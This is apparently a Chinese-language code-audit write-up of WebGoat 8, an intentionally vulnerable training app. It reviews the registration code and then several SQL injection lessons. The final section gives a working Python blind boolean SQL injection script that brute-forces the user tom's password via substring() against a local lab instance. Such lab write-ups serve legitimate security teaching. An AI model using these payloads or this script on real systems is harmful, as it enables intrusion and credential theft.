    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.ModelAttribute;
    import org.springframework.web.bind.annotation.PostMapping;
    import javax.servlet.http.HttpServletRequest;
    import javax.validation.Valid;
    @Controller
    @AllArgsConstructor
    @Slf4j
    public class RegistrationController {
        private UserValidator userValidator;
        private UserService userService;
        private AuthenticationManager authenticationManager;
        @GetMapping("/registration")
        public String showForm(UserForm userForm) {
            return "registration";
        }
        @PostMapping("/register.mvc")
        @SneakyThrows
        public String registration(@ModelAttribute("userForm") @Valid UserForm userForm, BindingResult bindingResult, HttpServletRequest request) {
            userValidator.validate(userForm, bindingResult);
            if (bindingResult.hasErrors()) {
                return "registration";
            }
            userService.addUser(userForm.getUsername(), userForm.getPassword());
            request.login(userForm.getUsername(), userForm.getPassword());
            return "redirect:/attack";
        }
    }
重点关注：
    @PostMapping("/register.mvc")
        @SneakyThrows
        public String registration(@ModelAttribute("userForm") @Valid UserForm userForm, BindingResult bindingResult, HttpServletRequest request) {
            //使用userRepository.findByUsername检测注册名是否已被使用，是则设置一个error
            //查看请求报文中密码和确认密码是否相同，不同则设置一个error
            userValidator.validate(userForm, bindingResult);
            //查看是否存在error
            if (bindingResult.hasErrors()) {
                return "registration";
            }
            //追踪过去，addUser里面数据库操作使用自定义继承JpaRepository接口，没有注入问题。
            userService.addUser(userForm.getUsername(), userForm.getPassword());
            request.login(userForm.getUsername(), userForm.getPassword());
            return "redirect:/attack";
        }
UserValidator.java
    public class UserValidator implements Validator {
        private final UserRepository userRepository;
        @Override
        public boolean supports(Class aClass) {
            return UserForm.class.equals(aClass);
        }
        @Override
        public void validate(Object o, Errors errors) {
            UserForm userForm = (UserForm) o;
            if (userRepository.findByUsername(userForm.getUsername()) != null) {
                errors.rejectValue("username", "username.duplicate");
            }
            if (!userForm.getMatchingPassword().equals(userForm.getPassword())) {
                errors.rejectValue("matchingPassword", "password.diff");
            }
        }
    }
UserService.java
    public void addUser(String username, String password) {
            userRepository.save(new WebGoatUser(username, password));
            userTrackerRepository.save(new UserTracker(username));
        }
userRepository.java
    public interface UserRepository extends JpaRepository {
        WebGoatUser findByUsername(String username);
        List findAll();
    }
UserTrackerRepository.java
    public interface UserTrackerRepository extends JpaRepository {
        UserTracker findByUser(String user);
    }
总结：注册功能关键数据库操作部分使用JpaRepository作为父类的接口，编写符合规范，不存在注入问题。
SqlInjection
再次声明：WebGoat8是故意不安全的Web应用程序，旨在教授Web应用程序安全性课程。所以接下来朋友们看到的漏洞都是非常直接的，非常不贴近生产环境的。在现实情况中出现这么直接的漏洞的概率是非常低的。下面我们仅挑几个sql注入来看一下。
SqlInjection.lesson/1
看表输入SQL query语句，取出Bob Franco的信息。
直接将传入的query参数丢进去executeQuery，这个例子比参数拼接sql语句更暴力。
    @AssignmentPath("/SqlInjection/attack2")
    @AssignmentHints(value = {"SqlStringInjectionHint2-1", "SqlStringInjectionHint2-2", "SqlStringInjectionHint2-3", "SqlStringInjectionHint2-4"})
    public class SqlInjectionLesson2 extends AssignmentEndpoint {
        @RequestMapping(method = RequestMethod.POST)
        public
        @ResponseBody
        AttackResult completed(@RequestParam String query) {
            return injectableQuery(query);
        }
        protected AttackResult injectableQuery(String _query) {
            try {
                Connection connection = DatabaseUtilities.getConnection(getWebSession());
                String query = _query;
                try {
                    Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
                            ResultSet.CONCUR_READ_ONLY);
                    ResultSet results = statement.executeQuery(_query);
/SqlInjection.lesson/8
将account,operator,injection三个参数直接
    @AssignmentPath("/SqlInjection/assignment5a")
    @AssignmentHints(value = {"SqlStringInjectionHint5a1"})
    public class SqlInjectionLesson5a extends AssignmentEndpoint {
      private static final String EXPLANATION = " Explanation: This injection works, because or '1' = '1' "
              + "always evaluates to true (The string ending literal for '1 is closed by the query itself, so you should not inject it). "
              + "So the injected query basically looks like this: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE, "
              + "which will always evaluate to true, no matter what came before it.";
      @PostMapping
      public
      @ResponseBody
      AttackResult completed(@RequestParam String account, @RequestParam String operator, @RequestParam String injection) {
        return injectableQuery(account + " " + operator + " " + injection);
      }
      protected AttackResult injectableQuery(String accountName) {
        String query = "";
        try {
          Connection connection = DatabaseUtilities.getConnection(getWebSession());
          //非常明显，accountName完全可控，直接丢到statement.executeQuery(query)中执行sql查询。
          query = "SELECT * FROM user_data WHERE first_name = 'John' and last_name = '" + accountName + "'";
          try(Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
                  ResultSet.CONCUR_READ_ONLY)) {
            ResultSet results = statement.executeQuery(query);
            ......
SqlInjectionAdvanced.lesson/4
在这个例子中，我们看到提示：
> We now explained the basic steps involved in an SQL injection. In this
> assignment you will need to combine all the things we explained in the SQL
> lessons.
>
> Goal: Can you login as Tom?  
>  使用tom的身份登陆  
>
通读代码
SqlInjectionChallenge.java
在这一篇代码中，我们既能看到非常典型的拼接sql语句导致的sql注入，也能看到符合规范的使用preparedStatement去防止sql注入。
    public class SqlInjectionChallenge extends AssignmentEndpoint {
        private static final String PASSWORD_TOM = "thisisasecretfortomonly";
        //Make it more random at runtime (good luck guessing)
        static final String USERS_TABLE_NAME = "challenge_users_6" + RandomStringUtils.randomAlphabetic(16);
        @Autowired
        private WebSession webSession;
        public SqlInjectionChallenge() {
            log.info("Challenge 6 tablename is: {}", USERS_TABLE_NAME);
        }
        //使用PUT http method进行参数提交
        @PutMapping  //assignment path is bounded to class so we use different http method :-)
        @ResponseBody
        public AttackResult registerNewUser(@RequestParam String username_reg, @RequestParam String email_reg, @RequestParam String password_reg) throws Exception {
            AttackResult attackResult = checkArguments(username_reg, email_reg, password_reg);
            if (attackResult == null) {
                Connection connection = DatabaseUtilities.getConnection(webSession);
                checkDatabase(connection);
                try {
                    String checkUserQuery = "select userid from " + USERS_TABLE_NAME + " where userid = '" + username_reg + "'";
                    Statement statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery(checkUserQuery);
                    if (resultSet.next()) {
                        attackResult = failed().feedback("user.exists").feedbackArgs(username_reg).build();
                    } else {
                        PreparedStatement preparedStatement = connection.prepareStatement("INSERT INTO " + USERS_TABLE_NAME + " VALUES (?, ?, ?)");
                        preparedStatement.setString(1, username_reg);
                        preparedStatement.setString(2, email_reg);
                        preparedStatement.setString(3, password_reg);
                        preparedStatement.execute();
                        attackResult = success().feedback("user.created").feedbackArgs(username_reg).build();
                    }
                } catch(SQLException e) {
                    attackResult = failed().output("Something went wrong").build();
                }
                }
                return attackResult;
        }
        private AttackResult checkArguments(String username_reg, String email_reg, String password_reg) {
            if (StringUtils.isEmpty(username_reg) || StringUtils.isEmpty(email_reg) || StringUtils.isEmpty(password_reg)) {
                return failed().feedback("input.invalid").build();
            }
            if (username_reg.length() > 250 || email_reg.length() > 30 || password_reg.length() > 30) {
                return failed().feedback("input.invalid").build();
            }
            return null;
        }
        static void checkDatabase(Connection connection) throws SQLException {
            try {
                Statement statement = connection.createStatement();
                System.out.println(USERS_TABLE_NAME);
                statement.execute("select 1 from " + USERS_TABLE_NAME);
            } catch (SQLException e) {
                createChallengeTable(connection);
            }
        }
        static void createChallengeTable(Connection connection) {
            Statement statement = null;
            try {
                statement = connection.createStatement();
                String dropTable = "DROP TABLE " + USERS_TABLE_NAME;
                statement.executeUpdate(dropTable);
            } catch (SQLException e) {
                log.info("Delete failed, this does not point to an error table might not have been present...");
            }
            log.debug("Challenge 6 - Creating tables for users {}", USERS_TABLE_NAME);
            try {
                String createTableStatement = "CREATE TABLE " + USERS_TABLE_NAME
                        + " (" + "userid varchar(250),"
                        + "email varchar(30),"
                        + "password varchar(30)"
                        + ")";
                statement.executeUpdate(createTableStatement);
                String insertData1 = "INSERT INTO " + USERS_TABLE_NAME + " VALUES ('larry', 'PI:EMAIL', 'larryknows')";
                String insertData2 = "INSERT INTO " + USERS_TABLE_NAME + " VALUES ('tom', 'PI:EMAIL', '" + PASSWORD_TOM + "')";
                String insertData3 = "INSERT INTO " + USERS_TABLE_NAME + " VALUES ('alice', 'PI:EMAIL', 'rt*(KJ()LP())$#**')";
                String insertData4 = "INSERT INTO " + USERS_TABLE_NAME + " VALUES ('eve', 'PI:EMAIL', '**********')";
                statement.executeUpdate(insertData1);
                statement.executeUpdate(insertData2);
                statement.executeUpdate(insertData3);
                statement.executeUpdate(insertData4);
            } catch (SQLException e) {
                log.error("Unable create table", e);
            }
        }
    }
问题代码块：
直接将username_reg拼接到checkUserQuery，然后进行sql查询。查询到有结果则返回已存在用户，否则则使用PreparedStatement和占位符去声明insert语句，然后再使用setString去设置对应参数之后再执行。insert的过程没有问题，我们利用statement.executeQuery(checkUserQuery)，以爆破的方式根据返回结果来获取tom的密码。
    try {
                    String checkUserQuery = "select userid from " + USERS_TABLE_NAME + " where userid = '" + username_reg + "'";
                    Statement statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery(checkUserQuery);
                    if (resultSet.next()) {
                        attackResult = failed().feedback("user.exists").feedbackArgs(username_reg).build();
                    } else {
                        PreparedStatement preparedStatement = connection.prepareStatement("INSERT INTO " + USERS_TABLE_NAME + " VALUES (?, ?, ?)");
                        preparedStatement.setString(1, username_reg);
                        preparedStatement.setString(2, email_reg);
                        preparedStatement.setString(3, password_reg);
                        preparedStatement.execute();
                        attackResult = success().feedback("user.created").feedbackArgs(username_reg).build();
                    }
条件为真，查询到信息，所以返回“PAYLOAD already exists please try to register with a different
username.”，”lessonCompleted” : false
条件为假，查询不到信息，返回“PAYLOAD ceated, please proceed to the login
page.”，”lessonCompleted” : true
用length()爆破出密码长度为23
利用substring()写脚本去爆破密码
脚本：
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    # author:jack
    # datetime:2019-09-01 22:31
    # software: PyCharm
    import requests
    import string
    def getPassword():
        cookies = {'JSESSIONID': 'dZcRiB0wXwYNLWxpjqdGiIHl2jJojW2fj4-eJRxT'}
        url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"
        password = ''
        for num in range(1, 24):
            for word in string.lowercase:
                pa = 'tom \'and substring(password,'+str(num)+',1)=\''+word+'\' -- kljh'
                payload = {'username_reg': pa,
                        'email_reg':'123%40123.com',
                           'password_reg': '123',
                           'confirm_password_reg': '123'
                }
                r = requests.put(url, cookies=cookies, data=payload)
                if r.json()['lessonCompleted'] == False:
                    password += word
                    print('password:' + password)
                    break
    if __name__ == "__main__":
        getPassword()
本次文章到此结束，感谢您的翻阅，期待您的宝贵意见。